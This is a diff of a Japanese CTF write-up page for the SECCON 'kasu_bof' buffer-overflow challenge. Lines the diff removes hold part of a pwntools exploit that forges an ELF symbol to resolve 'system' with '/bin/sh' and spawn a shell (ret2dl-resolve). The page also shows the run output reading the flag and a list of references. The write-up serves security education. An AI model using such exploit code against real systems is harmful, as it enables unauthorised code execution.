-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p32(st_value)
-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p32(st_size)
-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p8(st_info)
-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p8(st_other)
-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p16(st_shndx)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(Elf32_Sym)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create system symbol</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | symbol    | &#39;system&#39;                  | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create sh symbol</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | argment   | &#39;/bin/sh&#39;                 | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-20" class="outline-5">
+<p>
+<a href="https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof">https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof</a>
+</p>
 <h5 id="headline-20">
 実行結果
 </h5>
-<div id="outline-text-headline-20" class="outline-text-5">
+<p>
+以上の流れを踏まえて、作成したSolverを実行する。
+</p>
 <pre class="example">
 mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
-[*] &#39;/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall&#39;
+[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
 Arch:     i386-32-little
 RELRO:    Partial RELRO
 Stack:    No canary found
@@ -868,81 +808,138 @@ flag-4f8e964cf95b989f6def1afdfd0e91b7.txt
 $ cat flag*
 SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
 </pre>
-</div>
-</div>
-<div id="outline-container-headline-21" class="outline-5">
 <h5 id="headline-21">
 <code>SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}</code>
 </h5>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-22" class="outline-3">
 <h3 id="headline-22">
 参考
 </h3>
-<div id="outline-text-headline-22" class="outline-text-3">
 <ul>
 <li>
-<p>詳解セキュリティコンテスト</p>
+<p>
+詳解セキュリティコンテスト
+</p>
 <ul>
-<li><a href="https://book.mynavi.jp/ec/products/detail/id=122750">https://book.mynavi.jp/ec/products/detail/id=122750</a></li>
-<li>33.2.2 発展：関数シンボルの動的解決 pp.525</li>
-</ul>
+<li>
+<p>
+<a href="https://book.mynavi.jp/ec/products/detail/id=122750">https://book.mynavi.jp/ec/products/detail/id=122750</a>
+</p>
 </li>
 <li>
-<p>ROP stager + Return-to-dl-resolveによるASLR+DEP回避 - ももいろテクノロジー   </p>
-<ul>
-<li><a href="https://inaz2.hatenablog.com/entry/2014/07/15/023406">https://inaz2.hatenablog.com/entry/2014/07/15/023406</a></li>
-</ul>
-</li>
-<li>
-<p>ret2dl resolve - slideshare</p>
-<ul>
-<li><a href="https://www.slideshare.net/sounakano/ret2dl-resolve">https://www.slideshare.net/sounakano/ret2dl-resolve</a></li>
-</ul>
-</li>
-<li>
-<p>セキュリティコンテストチャレンジブック</p>
-<ul>
-<li><a href="https://book.mynavi.jp/ec/products/detail/id=42421">https://book.mynavi.jp/ec/products/detail/id=42421</a></li>
-<li>
-<p>2.4 エクスプロイト - Retrun to PLT (ret2plt) pp.109</p>
-<ul>
-<li>x86のROP</li>
-</ul>
+<p>
+33.2.2 発展：関数シンボルの動的解決 p.525
+</p>
 </li>
 </ul>
 </li>
 <li>
-<p>リンカ・ローダ実践開発テクニック</p>
+<p>
+ROP stager + Return-to-dl-resolveによるASLR+DEP回避 - ももいろテクノロジー   
+</p>
 <ul>
-<li><a href="https://shop.cqpub.co.jp/hanbai/books/38/38071.html">https://shop.cqpub.co.jp/hanbai/books/38/38071.html</a></li>
 <li>
-<p>2.9 シンボル・テーブル pp.54</p>
-<ul>
-<li>Elf_Sym構造体について    </li>
-</ul>
-</li>
-<li>
-<p>2.10 再配置テーブル pp.57</p>
-<ul>
-<li>Elf_Rel構造体について</li>
-</ul>
+<p>
+<a href="https://inaz2.hatenablog.com/entry/2014/07/15/023406">https://inaz2.hatenablog.com/entry/2014/07/15/023406</a>
+</p>
 </li>
 </ul>
 </li>
 <li>
-<p>gdbに構造体定義を読み込ませて使う - ももいろテクノロジー</p>
+<p>
+ret2dl resolve - slideshare
+</p>
 <ul>
-<li><a href="https://inaz2.hatenablog.com/entry/2014/07/21/124857">https://inaz2.hatenablog.com/entry/2014/07/21/124857</a></li>
+<li>
+<p>
+<a href="https://www.slideshare.net/sounakano/ret2dl-resolve">https://www.slideshare.net/sounakano/ret2dl-resolve</a>
+</p>
+</li>
+</ul>
+</li>
+<li>
+<p>
+セキュリティコンテストチャレンジブック
+</p>
+<ul>
+<li>
+<p>
+<a href="https://book.mynavi.jp/ec/products/detail/id=42421">https://book.mynavi.jp/ec/products/detail/id=42421</a>
+</p>
+</li>
+<li>
+<p>
+2.4 エクスプロイト - Retrun to PLT (ret2plt) p.109
+</p>
+<ul>
+<li>
+<p>
+x86のROP
+</p>
+</li>
 </ul>
 </li>
 </ul>
-</div>
-</div>
+</li>
+<li>
+<p>
+リンカ・ローダ実践開発テクニック
+</p>
+<ul>
+<li>
+<p>
+<a href="https://shop.cqpub.co.jp/hanbai/books/38/38071.html">https://shop.cqpub.co.jp/hanbai/books/38/38071.html</a>
+</p>
+</li>
+<li>
+<p>
+2.9 シンボル・テーブル p.54
+</p>
+<ul>
+<li>
+<p>
+Elf_Sym構造体について    
+</p>
+</li>
+</ul>
+</li>
+<li>
+<p>
+2.10 再配置テーブル p.57
+</p>
+<ul>
+<li>
+<p>
+Elf_Rel構造体について
+</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>
+<p>
+ret2dl_resolve Sections 關係表
+</p>
+<ul>
+<li>
+<p>
+<a href="https://hackmd.io/@LJP/BkJmAqXEI">https://hackmd.io/@LJP/BkJmAqXEI</a>
+</p>
+</li>
+<li>
+<p>
+ELfのマクロについて
+</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>
+created 2022/11/11<br>
+updated 2022/12/21
+</p>
 
     </div>
     <footer class="content__footer"></footer>
@@ -981,8 +978,6 @@ SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
     
     
     
-    
-      
     
       
     
